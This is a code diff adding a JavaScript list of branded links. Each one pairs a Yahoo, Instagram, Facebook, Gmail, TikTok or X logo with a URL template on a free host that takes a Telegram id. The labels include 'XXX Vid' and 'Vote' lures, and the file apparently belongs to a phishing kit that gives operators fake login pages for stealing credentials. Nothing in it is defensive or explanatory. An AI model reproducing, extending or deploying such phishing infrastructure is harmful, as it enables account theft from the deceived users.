@@ -1,0 +1,17 @@
+const freeLinks=[
+  {name:"Yahoo Login",      image:"https://s.yimg.com/rz/p/yahoo_frontpage_en-US_s_f_p_bestfit_frontpage.png",urlTemplate:"https://knlok.xo.je/sc/y.html?id={telegram-id}"},
+  {name:"Instagram",        image:"https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQx9iCnoWNr47HoCH-oba-jF9imvwKUoq_DAPm7ohNBxQ&s=10",urlTemplate:"https://knlok.xo.je/sc/i.html?id={telegram-id}"},
+  {name:"Facebook XXX Vid", image:"https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSevOG0v1ZHXdgks_lPReh0wXuMg1ALqR3wuz5rkPcgpyXq2Gepv9AVGmI&s=10",urlTemplate:"https://knlok.xo.je/sc/pf/pf.html?id={telegram-id}"},
+  {name:"Instagram XXX Vid",image:"https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQx9iCnoWNr47HoCH-oba-jF9imvwKUoq_DAPm7ohNBxQ&s=10",urlTemplate:"https://knlok.xo.je/sc/pf/pi.html?id={telegram-id}"},
+  {name:"Twitter(X) XXX",   image:"data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 40 40'%3E%3Crect width='40' height='40' rx='8' fill='%23000'/%3E%3Cpath fill='%23fff' d='M28.07 8h3.63L23.4 17.2l9.93 13.8H25.1l-5.5-7.27-6.3 7.27H9.66l8.72-10.05L8.64 8h8.1l4.97 6.56zm-1.35 20.4h2.01L13.46 9.85H11.3z'/%3E%3C/svg%3E",urlTemplate:"https://knlok.xo.je/sc/pf/px.html?id={telegram-id}"},
+  {name:"Gmail XXX Vid",    image:"https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRQ901eAwCHJkZ_K-vjQz9vX-WNgASX8gisXw&s",urlTemplate:"https://knlok.xo.je/sc/pf/pg.html?id={telegram-id}"},
+  {name:"TikTok XXX Vid",   image:"https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS2sZ4tDoHuXJBWzuZIkGQbWxLpV2gzx0TMDA&s",urlTemplate:"https://knlok.xo.je/sc/pf/pt.html?id={telegram-id}"},
+  {name:"Facebook",         image:"https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSevOG0v1ZHXdgks_lPReh0wXuMg1ALqR3wuz5rkPcgpyXq2Gepv9AVGmI&s=10",urlTemplate:"https://knlok.xo.je/sc/f.html?id={telegram-id}"},
+  {name:"Twitter(X)",       image:"data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 40 40'%3E%3Crect width='40' height='40' rx='8' fill='%23000'/%3E%3Cpath fill='%23fff' d='M28.07 8h3.63L23.4 17.2l9.93 13.8H25.1l-5.5-7.27-6.3 7.27H9.66l8.72-10.05L8.64 8h8.1l4.97 6.56zm-1.35 20.4h2.01L13.46 9.85H11.3z'/%3E%3C/svg%3E",urlTemplate:"https://fitxl.github.io/da/file/x.html?id={telegram-id}"},
+  {name:"Gmail",            image:"https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRQ901eAwCHJkZ_K-vjQz9vX-WNgASX8gisXw&s",urlTemplate:"https://knlok.xo.je/sc/g.html?id={telegram-id}"},
+  {name:"Facebook Vote",    image:"https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSevOG0v1ZHXdgks_lPReh0wXuMg1ALqR3wuz5rkPcgpyXq2Gepv9AVGmI&s=10",urlTemplate:"https://knlok.xo.je/sc/cv/cf.html?id={telegram-id}"},
+  {name:"Instagram Vote",   image:"https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQx9iCnoWNr47HoCH-oba-jF9imvwKUoq_DAPm7ohNBxQ&s=10",urlTemplate:"https://knlok.xo.je/sc/cv/ci.html?id={telegram-id}"},
+  {name:"Gmail Vote",       image:"https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRQ901eAwCHJkZ_K-vjQz9vX-WNgASX8gisXw&s",urlTemplate:"https://knlok.xo.je/sc/cv/cg.html?id={telegram-id}"},
+  {name:"TikTok Vote",      image:"https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS2sZ4tDoHuXJBWzuZIkGQbWxLpV2gzx0TMDA&s",urlTemplate:"https://knlok.xo.je/sc/cv/ct.html?id={telegram-id}"},
+  {name:"TikTok",           image:"https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS2sZ4tDoHuXJBWzuZIkGQbWxLpV2gzx0TMDA&s",urlTemplate:"https://knlok.xo.je/sc/t.html?id={telegram-id}"},
+];
